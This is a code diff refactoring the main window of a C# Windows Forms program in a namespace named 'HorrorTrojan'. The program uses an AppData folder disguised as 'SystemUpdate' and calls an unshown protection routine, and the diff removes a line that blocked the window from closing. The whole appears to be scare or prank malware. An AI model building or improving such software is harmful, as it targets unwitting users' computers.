@@ -1,4 +1,3 @@
-// MainInterface.cs
 using System;
 using System.Drawing;
 using System.Windows.Forms;
@@ -42,24 +41,14 @@ namespace HorrorTrojan
         private bool isGlitchActive = false;
         private bool isVideoActive = false;
         private Random rnd = new Random();
-        private PictureBox pictureBox;
-        private Label timerLabel;
-        private Panel bottomPanel;
-        private Image gifImage;
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private SoundPlayer musicPlayer;
+        private Image gifImage;
 
         public MainInterface()
         {
             InitializeComponent();
-            SetupForm();
-            LoadResources();
-            StartTimers();
-            SetupProtection();
-            PlayMusic();
-
-            this.Show();
-            this.BringToFront();
+            this.Load += MainInterface_Load;
         }
 
         private void InitializeComponent()
@@ -105,9 +94,12 @@ namespace HorrorTrojan
             this.ResumeLayout(false);
         }
 
-        private void SetupForm()
+        private void MainInterface_Load(object sender, EventArgs e)
         {
-            this.FormClosing += (s, e) => e.Cancel = true;
+            LoadResources();
+            StartTimers();
+            SetupProtection();
+            PlayMusic();
         }
 
         private void LoadResources()
@@ -120,7 +112,7 @@ namespace HorrorTrojan
                     gifImage = Image.FromFile(gifPath);
                     this.pictureBox.Image = gifImage;
                     this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
-                    ImageAnimator.Animate(gifImage, (s, e) => { this.pictureBox.Invalidate(); });
+                    ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
                 }
             }
             catch { }
@@ -343,6 +335,10 @@ namespace HorrorTrojan
                 return cp;
             }
         }
+
+        private PictureBox pictureBox;
+        private Label timerLabel;
+        private Panel bottomPanel;
 
         protected override void Dispose(bool disposing)
         {
